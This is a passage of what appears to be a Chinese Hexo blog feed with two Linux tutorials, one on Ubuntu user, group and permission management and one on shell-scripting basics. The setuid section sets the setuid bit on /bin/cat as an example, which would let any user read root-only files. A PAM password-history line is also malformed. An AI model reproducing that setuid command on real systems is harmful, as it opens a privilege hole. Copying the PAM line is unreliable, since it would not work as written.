class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">sudo userdel user02 <span class="comment"># 不会删除主目录</span></span><br><span class="line">userdel -r user02   <span class="comment"># 删除账号同时删除主目录（一般先禁用几个月等到不需要一下文件时候再删除但是要提前备份）</span></span><br><span class="line">userdel -f user02   <span class="comment"># 强制删除文件</span></span><br><span class="line"></span><br><span class="line">rm -rf /home/user02   <span class="comment"># 删除用户主目录</span></span><br></pre></td></tr></table></figure></p><p><strong>切换账号</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 切换到root账号</span></span><br><span class="line">su<span class="comment"># 需要输入root密码（默认root没密码,先给root设密码[sudo passwd root]再操作）</span></span><br><span class="line">sudo su<span class="comment"># 输入当前账号密码(是输入的当前账号的密码)</span></span><br><span class="line">sudo -i<span class="comment"># 同上（root前面的命令提示符是井号）  exit退出到自己的回话</span></span><br><span class="line">sudo -s<span class="comment"># 同上</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 切换到其他账号</span></span><br><span class="line">su user01<span class="comment"># 切换到其他账号（输入的user01的密码）</span></span><br><span class="line">sudo su user01<span class="comment">#切换到其他账号（输入的是当前用户的密码）</span></span><br></pre></td></tr></table></figure></p><h2 id="组账号管理"><a href="#组账号管理" class="headerlink" title="组账号管理"></a><font color="red">组账号管理</font></h2><blockquote><p>分组归类统一管理</p></blockquote><ul><li>将用户账号分组管理和指派权限  </li><li>用户创建同时生成同名的组账号  </li><li>每个文件有<code>唯一</code>的所属账号和所属组（属主、数组）<ul><li>每个用户可以同属属于多个组，但<code>只有一个主组</code>  </li></ul></li></ul><p>查看当前用户所属的组： <code>groups</code> </p><p>cat /etc/groups<br>格式： <code>组名:密码(通常不使用):GID:逗号分隔的&#39;成员&#39;用户账号</code></p><p><strong>组管理</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">sudo groupadd g_name<span class="comment"># 添加组</span></span><br><span class="line">sudo groupdel g_name<span class="comment"># 删除组</span></span><br><span class="line"></span><br><span class="line">gpasswd -a u_name g_name<span class="comment"># 将用户加入'额外组'</span></span><br><span class="line">gpasswd -d u_name g_name    <span class="comment"># 将用户从组中删除</span></span><br><span class="line"></span><br><span class="line">usermod -aG g_name user<span class="comment"># 将用户加入'额外组'  a是添加,G是组</span></span><br><span class="line"><span class="comment"># -a    附件（否则替换）</span></span><br><span class="line">usermod -g g_name user  <span class="comment"># 修改用户的'主组'    -g    把user01的主组改为IT: sudo usermod -g IT user01</span></span><br><span class="line"></span><br><span class="line">usermod -d /home/user2 user2 -m  <span class="comment"># 将某用户主目录内容移动到当前目录</span></span><br><span class="line">usermod -l user2 user1<span class="comment"># 将用户user1修改为user2(只是名称换了，其他的权限和id都不变)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 等等其他参数......</span></span><br></pre></td></tr></table></figure></p><h2 id="密码策略"><a href="#密码策略" class="headerlink" title="密码策略"></a><font color="red">密码策略</font></h2><p>使用足够复杂的密码<br>Pluggable Authentication Module(PAM)<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装pam</span></span><br><span class="line">apt install libpam-cracklib</span><br><span class="line"></span><br><span class="line"><span class="comment"># vim /etc/pam.d/common-password    增加配置</span></span><br><span class="line">password      required    pam_pwhistory.so.remember=9 use_authok</span><br><span class="line"><span class="comment"># 最近几次的密码不能相同</span></span><br></pre></td></tr></table></figure></p><h6 id="权限"><a href="#权限" class="headerlink" title="权限"></a>权限</h6><p>每个文件和文件夹拥有唯一的属主和属组（<code>ls -l</code>）</p><p><strong>权限类型：</strong></p><ul><li>r, w, x            读，写，执行        4, 2,    1 （这个数字是二进制转换来的，假设数组的权限为r–,对应二进制为100,转为十进制为4，其他类似）</li><li>u，g，o        属主，属组，其他</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 除了第一位，后面每三位一组（所有者u，所有组g，其他用户o）</span><br><span class="line">-rwxrwxrwx</span><br><span class="line"></span><br><span class="line"># 权限文件   文件夹</span><br><span class="line"># R读取文件内容，拷贝 列出目录内容</span><br><span class="line"># W更改文件内容 创建、删除文件及文件夹</span><br><span class="line"># X作为应用程序执行文件 cd进入；读取文件属性和权限</span><br></pre></td></tr></table></figure><p><strong>权限修改命令：</strong><br>chmod<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 只有其属主和root可以修改权限</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 对文件</span></span><br><span class="line"><span class="comment"># + - 方式</span></span><br><span class="line">chmod u+x a.txt</span><br><span class="line">chmod u-r a.txt</span><br><span class="line">chmod g-x a.txt</span><br><span class="line">chmod o+r a.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 数字方式 </span></span><br><span class="line">chmod 777 b.txt</span><br><span class="line">chmod 764 b.txt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">## 对目录(一般都给x权限，不然cd不进去)</span></span><br><span class="line">chmod u+x code/</span><br><span class="line">chmod u-wx code/  </span><br><span class="line"><span class="comment"># 对目录：r只能看到里面的文件，要写看到属性，得加x权限</span></span><br><span class="line"><span class="comment"># 父级目录的权限/子文件的权限</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 递归修改权限</span></span><br><span class="line">chmod 770 -R code/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">## 权限与搜索</span></span><br><span class="line">find . -perm 770   <span class="comment"># 搜索权限为770的文件</span></span><br><span class="line"><span class="comment">#  -type f   只搜文件；    -type d  只搜目录</span></span><br><span class="line">find /path/dir/ -<span class="built_in">type</span> f perm 664 -user xps -group xps  <span class="comment"># 属于xps组，属于xps用户，权限为664的文件</span></span><br><span class="line">find /path/dir/ -<span class="built_in">type</span> f perm 755 -user xps -<span class="built_in">exec</span> ls -l &#123;&#125;\;   <span class="comment"># 搜索完之后执行命令</span></span><br><span class="line">find /path/dir/ -<span class="built_in">type</span> f perm 755 -user xps -<span class="built_in">exec</span> chmod 770 &#123;&#125;\;   <span class="comment"># 搜索完之后再进行权限修改</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果用户删了，并且该用户有文件没删除干净，下面找到没有所属用户的文件或文件夹</span></span><br><span class="line">find /home -nouser -<span class="built_in">exec</span> rm -rf &#123;&#125;\;    <span class="comment"># 查找无有效属主对象，然后删除</span></span><br></pre></td></tr></table></figure></p><h2 id="属主与属组"><a href="#属主与属组" class="headerlink" title="属主与属组"></a><font color="red">属主与属组</font></h2><p><strong>修改属主和属组</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># chown需要sudo</span></span><br><span class="line">sudo chown user01 a.txt   <span class="comment"># 修改a.txt的所有者为user01</span></span><br><span class="line">sudo chown -R user01 /code   <span class="comment"># 递归修改目录的所有者</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改所有组为user01</span></span><br><span class="line">sudo chgrp user01 a.txt</span><br><span class="line"><span class="comment"># 所有者和所有组都修改</span></span><br><span class="line">chown user01:user01 a.txt</span><br></pre></td></tr></table></figure></p><p><strong>特殊权限</strong></p><ol><li><p>Setuid(4)<br>主要针对可执行程序<br>一旦设置了suid之后：任何用户执行程序时都具备使用属主的权限<br>设置：<code>chmod u+s a.sh</code>或<code>chmod 4777 /bin/cat</code> (前面三个二进制, 二进制为100,即4；第二种数值方式对链接不生效)<br>比如使用<code>passwd</code>修改自己密码的时候修改的是shadow文件(他的属主是root)，它就是设置了<code>s</code>权限<br><img src="/ubuntu server-账号管理/20200318203240319_8090.png" alt></p><blockquote><p>如果不太懂，尽量不要随便设置suid，否则后患无穷</p></blockquote></li><li><p>Setgid(2)<br>主要针对可执行程序和目录<br>对于程序一旦设置了sgid：任何用户执行程序时都具备使用属组的权限<br>应用于目录时：可实现<code>共享文件访问效果</code>(新建文件的数组集成目录属组):  一个用户再在里面新建文件之后，一个组里的用户就都可以共享<br>设置：<code>chmod g+s code/</code>或<code>sudo chmod 2775 /bin/cat</code><br>设置完之后，数组位置权限就多了s权限<br><img src="/ubuntu server-账号管理/20200318203113628_4438.png" alt></p></li><li><p>stick bit(1)<br><code>针对目录</code>的受限删除位（root、属主可以删）<br>典型例子：<code>/tmp</code>目录<br>设置： <code>chmod o+t code/</code><br>加了stick位(其他用户的位置)，自己创建的文件只有自己能删除，别人无法删除<br><img src="/ubuntu server-账号管理/20200318202916501_30856.png" alt></p></li></ol><h2 id="权限管理"><a href="#权限管理" class="headerlink" title="权限管理"></a><font color="red">权限管理</font></h2><h6 id="掩码"><a href="#掩码" class="headerlink" title="掩码"></a>掩码</h6><p>决定文件和目录的<code>默认权限</code>  </p><pre><code>- 文件默认权限：`666`-掩码（如果掩码为002, 6-2=4，权限就为664）- 文件夹默认权限：`777`-掩码（如果掩码为002, 7-2=5，权限就为775）</code></pre><p>命令：<code>umask</code>查看当前掩码<br>修改掩码命令：<code>umask 007</code>（临时性的）<br><strong>长久修改：</strong><br>配置文件<code>vi /etc/login.defs</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 配置其中umask</span><br><span class="line">UMASK 022   # 属主的掩码0，数组的掩码2，其他用户的掩码2</span><br><span class="line">USERGROUPS_ENAByes  # 改为yes，属主的掩码来覆盖数组的掩码</span><br><span class="line"># 要想使得真正的权限与umask设置的一致：</span><br><span class="line">F1.可以把上面的改为no</span><br><span class="line">F2.设置用户账号名称和组账号名称不一样，让用户id和组id也不一样（推荐这种方式修改）</span><br><span class="line">sudo usermod -g users user01 # 把用户的主组改为users</span><br></pre></td></tr></table></figure></p><p>umask<br>    002            用户名与组名相同、UID与GID相同</p><p>umask<br>    027             通常设置027就行</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;用户账号管理基础&quot;&gt;&lt;a href=&quot;#用户账号管理基础&quot; class=&quot;headerlink&quot; title=&quot;用户账号管理基础&quot;&gt;&lt;/a&gt;&lt;font color=&quot;red&quot;&gt;用户账号管理基础&lt;/font&gt;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;用户账号管理&lt;/stron
      
    
    </summary>
    
      <category term="Linux" scheme="http://www.xpshuai.cn/categories/Linux/"/>
    
    
      <category term="Linux" scheme="http://www.xpshuai.cn/tags/Linux/"/>
    
      <category term="ubuntu" scheme="http://www.xpshuai.cn/tags/ubuntu/"/>
    
      <category term="账号管理" scheme="http://www.xpshuai.cn/tags/%E8%B4%A6%E5%8F%B7%E7%AE%A1%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>shell脚本基本知识</title>
    <link href="http://www.xpshuai.cn/shell%E8%84%9A%E6%9C%AC%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/"/>
    <id>http://www.xpshuai.cn/shell脚本基本知识/</id>
    <published>2020-03-16T09:01:17.000Z</published>
    <updated>2020-03-16T09:07:35.212Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/shell脚本基本知识/title.jpg"></p><a id="more"></a><h2 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h2><ul><li><p>自动批量系统初始化（update，软件安装，时区设置，安全策略…）</p></li><li><p>自动化批量软件部署程序（LAMP/LNMP/Apache/LVS/Nginx)</p></li><li><p>管理应用程序（KVM，集群管理扩容，MySQL， DELLR720批量RAID）</p></li><li><p>日志分析处理日志（PV,UV, 200,!200, top 100/ grep, awk）</p></li><li><p>自动化备份恢复程序(MySQL完全/增量备份 + Crond)</p></li><li><p>自动化管理程序(批量远程修改密码，软件升级，配置更新)</p></li><li><p>自动化信息采集及监控程序（实时地收集系统/应用的状态信息:CPU,Mem,Disk,Net…）</p></li><li><p>配合zabbix信息采集（实时地收集系统/应用的状态信息:CPU,Mem,Disk,Net…）</p></li><li><p>自动化扩容（增加云主机-&gt;部署应用）</p></li><li><p>Zabbix监控CPU 80% + 调用Python的api 对AWS/EC2，ESC(增加 /删除云主机)+ Shell 脚本（业务上线）</p></li></ul><blockquote><p>程序的组成： 逻辑 + 数据</p></blockquote><h2 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h2><h4 id="一-常识"><a href="#一-常识" class="headerlink" title="一.常识"></a>一.常识</h4><p><strong>1.输入输出重定向</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 文件描述符：0，1,2    (对应：进程输入的文件，进程输入的文件，进程打开错误的文件)</span></span><br><span class="line">0表示标准输入</span><br><span class="line">1表示标准输出</span><br><span class="line">2表示标准错误输出</span><br><span class="line"></span><br><span class="line"><span class="comment">## 输入输出重定向</span></span><br><span class="line"><span class="comment"># &gt;, &gt;&gt;</span></span><br><span class="line">&gt; 默认为标准输出重定向，与 1&gt; 相同</span><br><span class="line">2&gt;&amp;1 把标准错误输出 重定向到 标准输出.</span><br><span class="line">&amp;&gt;a.txt 把标准输出 和 标准错误输出 都重定向到文件中</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2&gt;, 2&gt;&gt;   错误输出最佳</span></span><br><span class="line"><span class="comment"># 2&gt;&gt;&amp;1, &amp;&gt;   描述符为2的内容输入到描述符为1的内容(&amp;&gt; 是混合输出)</span></span><br><span class="line">cat &lt; /etc/hosts  <span class="comment">#（没加任何参数） 和不加&lt;的机制不一样</span></span><br><span class="line">cat &lt; /etc/hosts &gt; <span class="built_in">test</span>/aaa.txt  <span class="comment"># 相当于copy文件内容</span></span><br><span class="line">cat &lt;&lt; EOF   <span class="comment"># 输入内容让cat来执行</span></span><br><span class="line">cat &lt;&lt;EOF &gt; file1   <span class="comment"># 把一会输入的文件放到文件里面去 </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 混合重定向  输出到/dev/null就是什么都不显示到终端</span></span><br><span class="line">&amp;&gt; /dev/null</span><br></pre></td></tr></table></figure><p><strong>2.一些快捷键</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ^R   搜索历史命令</span></span><br><span class="line"><span class="comment"># ![number]      执行历史命令中编号为`number`的命令</span></span><br><span class="line"><span class="comment"># ! string       找到最近一个以指定str开头的命令, 如：!da  </span></span><br><span class="line"><span class="comment"># !!  上一个命令（在脚本中是不能手动按方向键的）</span></span><br><span class="line"><span class="comment"># !$  shell上一个命令的最后一个参数，</span></span><br><span class="line">比如：ls aaa/bb /etc/passwd,   再执行： head !$, 看到是的passwd的内容</span><br><span class="line"></span><br><span class="line"><span class="comment"># ^D   退出</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ^A   跳到最前</span></span><br><span class="line"><span class="comment"># ^E   跳到最后</span></span><br><span class="line"><span class="comment"># ^K   向后删除</span></span><br><span class="line"><span class="comment"># ^U   向前 删除</span></span><br><span class="line"><span class="comment"># ^Y   撤销</span></span><br><span class="line"><span class="comment"># ^L</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ^S   锁屏暂停</span></span><br><span class="line"><span class="comment"># ^Q   恢复</span></span><br></pre></td></tr></table></figure><p><strong>3.在bash程序中嵌入一个python代码</strong> </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># 第一行不是注释， 声明用哪个解释器 #!</span></span><br><span class="line"></span><br><span class="line">ping -c1 114.114.114.114 &amp;&amp; <span class="built_in">echo</span> <span class="string">"114.114.114.114 is up"</span> || <span class="built_in">echo</span> <span class="string">"114.114.114.114 id down"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># &lt;&lt;-DOF：EOF是开始结束的标识（小横杠代表以下按tab,下面的py代码可以不tab缩进), EOF是不成文的规范</span></span><br><span class="line"><span class="comment"># 整个程序还是使用bash解释器，只不过是中间"请来一个人 - python"</span></span><br><span class="line"><span class="comment"># 如下：</span></span><br><span class="line">/usr/bin/python3 &lt;&lt;-EOF</span><br><span class="line"><span class="built_in">print</span>(<span class="string">"hello py"</span>)</span><br><span class="line">EOF</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"hello bash"</span></span><br><span class="line"><span class="comment"># 在bash中调用 python： expect</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果在python中使用bash， 要调用os.system('系统命令')</span></span><br></pre></td></tr></table></figure><p>没有<code>-</code>的话，EOF作为结束符，前面不能有任何tab制表符。<br>有<code>-</code>的话，EOF作为结束符，前面可以有tab制表符,<code>容错</code>率更高一点。</p><p><strong>4.配合figlet打印菜单:</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">cat &lt;&lt;EOF</span><br><span class="line">+-----------------------------------------------------+</span><br><span class="line">|                                         _          |</span><br><span class="line">|        _ __ ___   __ _ _ __ _   _  __ _| |         |</span><br><span class="line">|       | <span class="string">'_ \` _ \ / _\` | '</span>_ \| | ||/ _\` | |              |</span><br><span class="line">|       | | | | | | (_| | | | | |_| |(_| | |         |</span><br><span class="line">|       |_| |_| |_|\__,_|_||_|\__,_|\__,_|_|         |</span><br><span class="line">|                                                    |</span><br><span class="line">+-----------------------------------------------------+</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure><p><strong>5.子shell</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> ~/Desktop</span><br><span class="line">ls</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这种做法，在终端执行完毕之后，当前目录还是没有变，因为他是在subshell （子shell中执行的）</span></span><br><span class="line"><span class="comment"># 要想使得subshell中的生效，就要使用`.` 或者 `source`</span></span><br><span class="line"></span><br><span class="line"><span class="comment">####### 执行脚本</span></span><br><span class="line">./01.sh      <span class="comment"># 需要执行权限，在子shell中执行</span></span><br><span class="line">bash 01.sh   <span class="comment"># 不需要执行权限，在子shell中执行</span></span><br><span class="line"></span><br><span class="line">01.sh          <span class="comment"># 需要执行权限，在当前shell中执行</span></span><br><span class="line"><span class="built_in">source</span> 01.sh   <span class="comment"># 不需要执行权限，在当前shell中执行</span></span><br></pre></td></tr></table></figure><p><strong>6.shell元字符</strong></p><p>通配符, 注意<code>区分</code>与<code>正则</code>中的元字符</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#！/bin/bash  </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># * 任意多个字符     </span></span><br><span class="line">ls /etc/net*</span><br><span class="line"></span><br><span class="line"><span class="comment"># ? 任意一个字符     </span></span><br><span class="line">ls home/xp?</span><br><span class="line"></span><br><span class="line"><span class="comment"># [] 匹配括号内任意一个字符   </span></span><br><span class="line">[abc]</span><br><span class="line">[a-z]    </span><br><span class="line">[^a-zA-Z0-9]     <span class="comment"># ^取反    </span></span><br><span class="line">l[io]ve         </span><br><span class="line">l[^a-z]ve          </span><br><span class="line"></span><br><span class="line"><span class="comment"># ()  命令在子shell中执行     </span></span><br><span class="line">(<span class="built_in">umask</span> 077; touch test.txt)    <span class="comment"># 不影响创建文件的权限，当前shell的umask也没有改变   </span></span><br><span class="line"><span class="comment"># ----- 回顾，子shell： .test.sh,     source x.sh</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># &#123;&#125;  集合     </span></span><br><span class="line">touch &#123;1..9&#125;   </span><br><span class="line">mkdir /home/&#123;111,222&#125;              </span><br><span class="line">mkdir -pv /home/&#123;333,&#123;aaa,bbb&#125;, 444&#125;</span><br><span class="line">cp -rv /etc/&#123;passwd, passwd.old&#125;    <span class="comment"># 前面的相同的路径可以写在一块，后面不同的&#123;&#125;起来</span></span><br><span class="line">cp -rv /etc/passwd&#123;,.old&#125;       <span class="comment"># 前面的相同的路径可以写在一块，后面不同的&#123;&#125;起来</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># \     转义符    让元字符回归本意      </span></span><br><span class="line"><span class="built_in">echo</span> \*     </span><br><span class="line"><span class="built_in">echo</span> \\     </span><br><span class="line"><span class="built_in">echo</span> \    <span class="comment">#后面紧跟回车，也就转义了回车</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># -e 常规字符转变为特殊意义的：</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">"a\tb\nc"</span></span><br></pre></td></tr></table></figure><p><strong>7.前台后台</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## &amp;  (关闭xshell，对应的任务也跟着停止)</span></span><br><span class="line">sh test.sh &amp;  </span><br><span class="line"></span><br><span class="line"><span class="comment">## nohub  </span></span><br><span class="line"><span class="comment">#任务放到后台，关闭标准输入，终端不再能够接收任何输入（标准输入）,重定向标准输出和标准错误到nohup.out中</span></span><br><span class="line">nohup sh test.sh  </span><br><span class="line"></span><br><span class="line"><span class="comment">## 区分`nohub`与`&amp;`:</span></span><br><span class="line">1.&amp; 是指在后台运行，但当用户推出(挂起)的时候，命令自动也跟着退出</span><br><span class="line">2.nohub 退出终端之后该进程还是有的</span><br><span class="line"></span><br><span class="line"><span class="comment">## nohub与&amp;合体</span></span><br><span class="line"><span class="comment">#将sh test.sh任务放到后台，但是依然可以使用标准输入，终端能够接收任何输入，重定向标准输出和标准错误到当前目录下的nohup.out文件，即使关闭xshell退出当前session依然继续运行。</span></span><br><span class="line">nohup sh test.sh  &amp; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">## screen   </span></span><br><span class="line">apt install screen   <span class="comment"># 安装</span></span><br><span class="line">`sleep 100000` <span class="comment"># 先执行,然后退出终端，</span></span><br><span class="line">`screen -list` <span class="comment"># 再次打开终端,指定这个命令，看到id</span></span><br><span class="line">`screen -r yourID` <span class="comment"># 然后输入这个命令,一切就回来了</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">## shell的会话作业机制</span></span><br><span class="line">ctrl +c <span class="comment"># 杀掉的是前台进程</span></span><br><span class="line"><span class="comment"># ^Z  放到后台， fg  调回来</span></span><br><span class="line"><span class="built_in">kill</span> %3  <span class="comment"># 给当前终端作业号为3的发信号</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## jobs 查看作业</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">## 管道  |</span></span><br><span class="line"><span class="comment"># tee 管道, -a 最佳</span></span><br><span class="line">date | tee -a date.txt   <span class="comment"># 输出到文件，同时截流（能在终端直观地看到）</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">## 技巧: vim里面写脚本，可以按^Z暂停，到终端敲命令，让fg返回继续</span></span><br></pre></td></tr></table></figure><p><strong>8.命令排序</strong></p><ol><li><p><code>;</code>   不具备逻辑排序  （前面执行完毕就执行后面的，不管前面成功失败与否）</p></li><li><p><code>&amp;&amp;</code>  前面执行<code>成功</code>(即返回值$?为0)就执行后面的</p></li><li><p><code>||</code>   前面执行<code>失败</code>(即返回值$?为不为0)就执行后面的</p><p>相当于 if  else</p></li></ol><p><strong>9.echo颜色输出</strong></p><p>使用场景：给用户醒目提示</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># -e 才可以</span></span><br><span class="line"><span class="comment"># \e[1;3x </span></span><br><span class="line"><span class="comment"># \e[1;3x   前景色(30-37),m后面是文字       </span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">"\e[1;31mThis is a red"</span></span><br><span 